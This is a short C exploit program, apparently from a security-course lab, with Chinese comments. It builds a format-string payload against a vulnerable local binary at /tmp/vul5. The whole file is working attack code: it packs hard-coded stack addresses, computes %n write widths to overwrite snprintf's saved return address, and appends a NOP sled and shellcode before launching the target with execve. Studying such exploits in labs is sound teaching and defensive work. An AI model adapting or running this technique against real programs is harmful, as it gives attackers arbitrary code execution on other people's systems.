#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode/shellcode.h"

#define TARGET "/tmp/vul5"

int main(void)
{
    char payload[400];
    memset(payload, 0x90, 400);
    //buf在栈中起始地址
    unsigned int buf_addr = 0xffffdb3c;
    //snprintf函数返回地址存放位置
    unsigned int snprintf_return_addr = 0xffffdb2c;
    //格式化字符串
    char *format_string =
        "\xff\xff\xff\xff\x2c\xdb\xff\xff" //修改 0xffffdb2c
        "\xff\xff\xff\xff\x2d\xdb\xff\xff" //修改 0xffffdb2d
        "\xff\xff\xff\xff\x2e\xdb\xff\xff" //修改 0xffffdb2e
        "\xff\xff\xff\xff\x2f\xdb\xff\xff" //修改 0xffffdb2f
        //shellcode的起始地址为0xffffdeb7所以需要将上面四个字节的位置修改为该值
        "%151u%n"   //! 151 + 32 = 0xb7
        "%39u%n"  //! 0xb7 + 39 = 0xde
        "%33u%n"   //! 0xde + 33 = 0xff
        "%256u%n"; //! 0xff + 256 = 0x1ff 
    //装载格式化字符串
    memcpy(payload, format_string, strlen(format_string));
    //shellcode相对于格式化字符出啊结尾的偏移
    unsigned int shellcode_offset = strlen(format_string) +32;
    //shellcode
    memcpy(payload + shellcode_offset, shellcode, strlen(shellcode));
    
    char *args[] = {TARGET, payload, NULL};
    char *env[] = {NULL};
    execve(TARGET, args, env);
    fprintf(stderr, "execve failed.\n");
    return 0;
}
